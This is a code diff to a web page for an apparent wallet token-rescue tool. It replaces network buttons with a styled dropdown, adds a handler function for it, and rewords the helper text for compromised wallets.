@@ -628,14 +628,30 @@
         <div class="step-number">1</div>
         <div class="step-body">
           <div class="step-label">Select Network</div>
-          <div class="network-selector">
-            <button class="net-select-btn active" data-chain="11155111" data-name="Sepolia Testnet" onclick="selectNetwork(this)">Sepolia (Test)</button>
-            <button class="net-select-btn" data-chain="1" data-name="Ethereum" onclick="selectNetwork(this)">Ethereum</button>
-            <button class="net-select-btn" data-chain="8453" data-name="Base" onclick="selectNetwork(this)">Base</button>
-            <button class="net-select-btn" data-chain="42161" data-name="Arbitrum" onclick="selectNetwork(this)">Arbitrum</button>
-            <button class="net-select-btn" data-chain="56" data-name="BSC" onclick="selectNetwork(this)">BSC</button>
-            <button class="net-select-btn" data-chain="1672" data-name="Pharos" onclick="selectNetwork(this)">Pharos ⚡</button>
-          </div>
+          <select id="networkDropdown" onchange="selectNetworkDropdown(this)" style="
+            width:100%;
+            background:#0f172a;
+            border:1px solid #1e293b;
+            border-radius:10px;
+            padding:13px 16px;
+            color:#e2e8f0;
+            font-size:14px;
+            font-weight:600;
+            outline:none;
+            cursor:pointer;
+            appearance:none;
+            -webkit-appearance:none;
+            background-image:url('data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' width=\'12\' height=\'8\' viewBox=\'0 0 12 8\'><path fill=\'%2364748b\' d=\'M1 1l5 5 5-5\'/></svg>');
+            background-repeat:no-repeat;
+            background-position:right 16px center;
+          ">
+            <option value="11155111" data-name="Sepolia Testnet">🧪 Sepolia Testnet (Testing)</option>
+            <option value="1" data-name="Ethereum">🔷 Ethereum Mainnet</option>
+            <option value="8453" data-name="Base">🔵 Base</option>
+            <option value="42161" data-name="Arbitrum">🔵 Arbitrum</option>
+            <option value="56" data-name="BSC">🟡 BSC</option>
+            <option value="1672" data-name="Pharos">⚡ Pharos (Airdrop Soon)</option>
+          </select>
           <div class="input-helper" id="networkHelper">Currently testing on Sepolia. Switch your wallet to Sepolia Testnet before connecting.</div>
         </div>
       </div>
@@ -659,7 +675,7 @@
             </div>
             <div class="wallet-status-dot" id="walletDot"></div>
           </button>
-          <div class="input-helper">⚠️ This is your <strong style="color:#fca5a5;">hacked wallet</strong>, the one with tokens stuck in it.</div>
+          <div class="input-helper">⚠️ This is your <strong style="color:#fca5a5;">compromised wallet</strong>, the one with tokens stuck in it or the wallet you used to connect to the airdrop claim site.</div>
         </div>
       </div>
 
@@ -888,6 +904,19 @@ var state = {
 // ─────────────────────────────────────────
 //  NETWORK SELECT
 // ─────────────────────────────────────────
+// ─────────────────────────────────────────
+//  NETWORK SELECT
+// ─────────────────────────────────────────
+function selectNetworkDropdown(select) {
+  state.selectedChainId = select.value;
+  var name = select.options[select.selectedIndex].getAttribute('data-name');
+  document.getElementById('networkHelper').textContent =
+    state.selectedChainId === "11155111"
+      ? "Currently testing on Sepolia. Switch your wallet to Sepolia Testnet before connecting."
+      : "Make sure your wallet is connected to " + name + " network.";
+  resetTokenList();
+}
+
 function selectNetwork(btn) {
   document.querySelectorAll('.net-select-btn').forEach(function(b) { b.classList.remove('active'); });
   btn.classList.add('active');
@@ -897,7 +926,6 @@ function selectNetwork(btn) {
     state.selectedChainId === "11155111"
       ? "Currently testing on Sepolia. Switch your wallet to Sepolia Testnet before connecting."
       : "Make sure your wallet is connected to " + name + " network.";
-  // Reset token list on network change
   resetTokenList();
 }
 
